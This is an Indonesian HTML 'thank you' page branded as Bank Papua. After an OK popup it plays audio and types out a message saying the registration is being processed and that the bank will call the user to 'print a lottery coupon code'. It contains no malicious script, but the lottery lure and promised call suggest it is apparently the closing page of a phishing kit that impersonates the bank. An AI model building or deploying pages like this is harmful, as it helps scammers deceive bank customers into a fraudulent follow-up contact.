<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Terima Kasih</title>
  <!-- Bootstrap CSS -->
  <link
    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
    rel="stylesheet"
  />
  <!-- Google Fonts: Poppins -->
  <link
    href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
    rel="stylesheet"
  />
  <!-- SweetAlert2 -->
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    /* Latar belakang halaman */
    body {
      background: linear-gradient(135deg, #e9f0f7, #f8f9fa);
      font-family: "Poppins", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
    }

    /* Container utama */
    .container {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      max-width: 600px;
      width: 100%;
      padding: 30px;
      text-align: center;
    }

    .header img {
      max-width: 120%;
      margin-bottom: 15px;
    }

    .img-fluid {
      margin-bottom: 15px;
      border-radius: 8px;
      max-height: 300px;
      object-fit: cover;
    }

    /* Kotak pesan dengan background tinggi, teks muncul satu per satu */
    .message {
      background: linear-gradient(135deg, #004080, #0059b3);
      color: #fff;
      padding: 15px;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 20px;
      position: relative;
      min-height: 120px; /* Bisa disesuaikan */
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* Area tempat teks diketik satu per satu */
    .typingText {
      white-space: pre-line; /* Agar bisa multiline */
      text-align: center;
      width: 100%;
      padding: 0 10px;
    }

    .footer {
      font-size: 14px;
      color: #777;
      margin-top: 10px;
    }

    /* Custom styling untuk SweetAlert2 pop-up */
    .swal2-border-radius {
      border-radius: 12px !important;
    }

    .swal2-image-custom {
      margin-bottom: -10px; /* Naikkan gambar agar lebih rapi */
    }
    .swal2-text-custom {
  width: 20px;
      /* Naikkan teks agar lebih rapi */
    }
    
  </style>
</head>
<body onload="initPage()">
  <div class="container">
    <div class="header">
      <img src="bank.png" alt="Logo" style="height: 120px ;" />
    </div>
    <img src="formakhirr.png" alt="Ilustrasi Pelanggan" class="img-fluid" />

    <!-- Kotak pesan dengan efek ketik (typewriter) -->
    <div class="message">
      <div id="typingContainer" class="typingText"></div>
    </div>

    <div class="footer">
      &copy; 2025 Bank Papua
    </div>
  </div>

  <audio id="thankYouAudio" src="suara.mp3"></audio>
  <script>
    // Teks yang akan ditampilkan dengan efek ketik
    const typewriterText = `Terimakasih Telah Mendaftar di Layanan Bank Papua.
  Pendaftaran Anda Sedang Diproses.
  Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank Papua
  Untuk Proses Cetak Kode Kupon Undian Anda.`;
  
    // Fungsi untuk memutar audio setelah tombol OK ditekan
    function playAudio() {
      const audio = document.getElementById("thankYouAudio");
      const playPromise = audio.play();
      if (playPromise !== undefined) {
        playPromise.catch((error) => {
          document.body.addEventListener(
            "click",
            () => {
              audio.play();
            },
            { once: true }
          );
        });
      }
    }
  
    // Efek ketik satu per satu huruf
    function typeWriterEffect(text, containerId, speed = 40) {
      let index = 0;
      const container = document.getElementById(containerId);
      container.innerHTML = ""; // Reset teks
  
      function typeChar() {
        if (index < text.length) {
          container.innerHTML += text.charAt(index);
          index++;
          setTimeout(typeChar, speed);
        }
      }
      typeChar();
    }
  
    // SweetAlert2 pop-up dengan gambar tester.jpg dan modal yang lebih kecil
    function showThankYouAlert() {
      Swal.fire({
        width: '320px',
        imageUrl: "tester.jpg",
        text: "Lanjut proses Penyelesaian.",
        imageAlt: "Bank Papua",
        confirmButtonText: "OK",
        confirmButtonColor: "#004080",
        customClass: {
          text: "swal2-text-custom",
          popup: "swal2-border-radius",
          image: "swal2-image-custom",
        },
      }).then((result) => {
        if (result.isConfirmed) {
          playAudio(); // Jalankan suara setelah tombol OK ditekan
          typeWriterEffect(typewriterText, "typingContainer", 40); // Jalankan efek ketik
        }
      });
    }
  
    // Fungsi inisialisasi saat halaman di-load
    function initPage() {
      showThankYouAlert(); // Tampilkan popup dulu, baru jalankan efek setelah OK
    }
  </script>
  
</body>
</html>
